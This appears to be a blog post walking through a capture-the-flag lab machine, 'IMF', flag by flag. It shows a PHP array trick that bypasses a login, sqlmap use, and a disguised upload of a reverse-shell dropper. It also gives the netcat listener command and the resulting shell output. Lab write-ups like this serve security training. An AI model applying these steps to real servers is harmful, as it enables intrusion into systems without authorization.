---
layout: post
title: You're up and running!
---

First flag in comments of contact.php
flag1{YWxsdGhlZmlsZXM=}
Flag1 decodes to allthefiles, which points to base64 encoded file names. The trick is to merge the names.
Decoded names are the second flag
flag2{aW1mYWRtaW5pc3RyYXRvcg==}
Flag 2 decodes to imfadministrator, which points to /imfadministrator
Comment under login form claims that he couldn't get the sql working so he hardcoded the password. At first i tried some sql injection fuzzing but it obviously didn't work.
Then it struck me: the error on the page said 'Invalid username.' so it probably will tell me if guessed correctly the user without password.
Tried admin and some combinations of roger, author of the comment but no luck. Then I remembered the /contact.php page. There is email rmichaels@imf.local for Roger so I figured it's his login.
Now the page says the password is wrong, so I'm on the good track. Now to break super-safe hardcoded password all you need to do is to make pass argument as an array like this:
user=rmichaels&pass[]=
flag3{Y29udGludWVUT2Ntcw==}
Decoded flag 3 says 'continueTOcms' which frankly is pretty obvious given it's the only link we see
CMS cracked with sqlmap
flag4{dXBsb2Fkcjk0Mi5waHA=}
Flag 4 decodes to uploadr942.php
Navigating to /imfadministrator/uploadr942.php reveals simple file uploader. 
Couple minutes of fiddling with different samples of files I found out the server
allows only graphic files, filtering in addition some 'dangerous' php functions.
After uploading the file we can find the comment with strange string.
It's the file name of a file found in the /imfadministrator/uploads/ folder
after uploading the image.
After more experimenting I found out that it does allow file_put_contents function, 
so I decided to obfuscate actual payload inside a dropper utilizing this function:
cp /usr/share/webshells/php/php-reverse-shell.php reverse-shell.php
Set proper host
cat reverse-shell.php | xxd -p | tr -d [:space:] > payloadhex.txt
Wrap it in php dropper and add GIF98 header to fool filter.
Next navigate to a dropper (remember to check the name of the file in the HTML comment)
after running a dropper we can setup a listener on attackers machine:
nc -lp 1234
and after navigating to /msfadministrator/uploads/backdoor.php we ge a shell!
Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 15:53:41 up  2:42,  0 users,  load average: 0.11, 0.12, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
Now we can navigate to /var/www/html/imfadministrator/uploads
And besides our uploaded junk we have a flag:
drwxr-xr-x 2 www-data www-data  4096 Jun  7 13:36 .
drwxr-xr-x 4 www-data www-data  4096 Oct 17  2016 ..
-rw-r--r-- 1 www-data www-data    82 Oct 12  2016 .htaccess
-rw-r--r-- 1 www-data www-data  6074 Jun  6 13:01 048cc0ba197b.gif
-rw-r--r-- 1 www-data www-data    27 Jun  2 10:53 15d75ca3b468.gif
-rw-r--r-- 1 www-data www-data 11052 Jun  7 13:36 29ab56559292.gif
-rw-r--r-- 1 www-data www-data  6061 Jun  6 10:57 4688d3be2edf.gif
-rw-r--r-- 1 www-data www-data 45944 Jun  2 10:49 66024f4e10de.jpg
-rw-r--r-- 1 www-data www-data  6089 Jun  6 10:59 825abef8c60f.gif
-rw-r--r-- 1 www-data www-data  5494 Jun  7 13:37 backdoor.php
-rw-r--r-- 1 www-data www-data 58816 Jun  1 13:09 bd580392b826.jpg
-rw-r--r-- 1 www-data www-data 58816 Jun  1 13:00 c4e76ada9220.jpg
-rw-r--r-- 1 www-data www-data    28 Oct 12  2016 flag5_abc123def.txt

flag5{YWdlbnRzZXJ2aWNlcw==}
Flag 5 decodes to agentservices
